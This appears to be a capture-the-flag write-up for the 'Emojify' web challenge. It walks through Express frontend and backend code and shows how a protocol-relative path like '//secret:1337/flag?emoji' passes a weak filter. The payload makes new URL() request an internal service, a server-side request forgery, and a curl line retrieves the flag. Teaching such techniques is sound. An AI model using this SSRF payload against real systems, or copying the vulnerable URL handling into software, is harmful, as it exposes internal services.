--------------

### AlpacaDaily

--------------

<img width="1212" height="254" alt="image" src="https://github.com/user-attachments/assets/9863be4c-9526-41aa-b2a7-5b088e7c098d" />

--------------

- Web
 - Emojify

--------------

### Emojify

--------------

<img width="848" height="473" alt="image" src="https://github.com/user-attachments/assets/1063eff2-c7e7-424a-9618-b4d01cdb4fb1" />

---------------

- Frontend js code-:

```js
import express from "express";
import fs from "node:fs";

const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
};

express()
  .get("/", (req, res) => res.type("html").send(fs.readFileSync("index.html")))
  .get("/api", async (req, res) => {
    try {
      const path = waf(req.query.path);
      const url = new URL(path, "http://backend:3000");
      const emoji = await fetch(url).then((r) => r.text());
      res.send(emoji);
    } catch (err) {
      res.send(err.message);
    }
  })
  .listen(3000);
```

- Waf function checks if the path is a `string`, it starts with `/` or includes `emoji`.It throws an error if it appears otherwise.-:

```js
const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
};
```

- The `/api/` route checks the query param which is passed to `new Url()` to form a path for `http://backend:3000` like `http://backend:3000/zzzz` if the path is `zzzz`.It passes to the `fetch()` to make a request.`Url()` is the vulnerable part but we'll get back to it later.

```js
express()
  .get("/", (req, res) => res.type("html").send(fs.readFileSync("index.html")))
  .get("/api", async (req, res) => {
    try {
      const path = waf(req.query.path);
      const url = new URL(path, "http://backend:3000");
      const emoji = await fetch(url).then((r) => r.text());
      res.send(emoji);
    } catch (err) {
      res.send(err.message);
    }
```
- Backtend code does nothing but sends an emoji-:

```js
import express from "express";
import * as emoji from "node-emoji";

express()
  .get("/emoji/:text", (req, res) =>
    res.send(emoji.get(req.params.text) ?? "❓")
  )
  .listen(3000);
```

- Last backend url is `secret:1337`.Code-:

```js
import express from "express";

const FLAG = process.env.FLAG ?? "Alpaca{REDACTED}";

express()
  // http://secret:1337/flag
  .get("/flag", (req, res) => res.send(FLAG))
  .listen(1337);
```
-  The route `/flag` returns the flag.
-  I checked [MDN-Web Apis](https://developer.mozilla.org/en-US/docs/Web/API/URL) for important info on Url(). If a relative url like `//secret:1337/flag` is passed as the first argument, it is picked over the absolute url as seen here.We can exploit this quirk to read this flag.

```js
new URL("//foo.example", "https://example.com");
// => 'https://foo.example/' (see relative URLs)
```

- Exploitng it
```js
"//secret:1337/flag?emoji"//I passed emoji as a query since it is required
```

- Using curl-:

```bash
curl http://34.170.146.252:5737/api\?path\=//secret:1337/flag\?emoji                                                                                                              
Alpaca{Sup3r_Speci4l_Rar3_Flag}%
```

```
